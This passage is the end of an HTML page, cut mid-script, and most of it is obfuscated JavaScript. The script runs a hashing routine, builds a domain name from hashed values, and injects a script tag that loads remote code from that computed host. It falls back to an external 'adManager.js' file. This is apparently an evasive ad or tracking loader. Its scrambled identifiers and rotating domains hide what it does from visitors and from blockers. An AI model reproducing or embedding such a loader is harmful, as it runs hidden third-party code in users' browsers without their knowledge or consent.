X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>